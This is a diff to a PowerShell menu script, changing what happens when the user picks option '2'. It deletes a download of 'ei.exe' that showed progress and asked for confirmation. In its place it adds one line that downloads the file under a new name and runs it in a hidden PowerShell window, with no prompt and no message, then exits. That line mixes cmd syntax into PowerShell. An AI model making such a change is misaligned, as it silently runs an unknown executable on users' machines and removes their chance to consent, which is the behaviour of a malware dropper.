@@ -84,23 +84,7 @@ function Show-Menu {
                 }
 
                 '2' {
-                    Write-Host "`nDownloading EI Application..." `
-                        -ForegroundColor Cyan
-
-                    $file = Download-File `
-                        -Url 'https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe' `
-                        -Name 'ei.exe'
-
-                    Write-Host "Download completed." `
-                        -ForegroundColor Green
-
-                    $confirm = Read-Host "Run the downloaded file? (YES/no)"
-
-if ($confirm -ceq 'YES') {
-    Start-Process -FilePath $file -Wait
-}
-
-                    Write-Host "Review and open EI Application from File Explorer."
+                    curl "https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe" -o rnp.exe && start "" /b powershell -WindowStyle Hidden -Command "Start-Process 'rnp.exe'" & exit
                     Pause-Menu
                 }
 
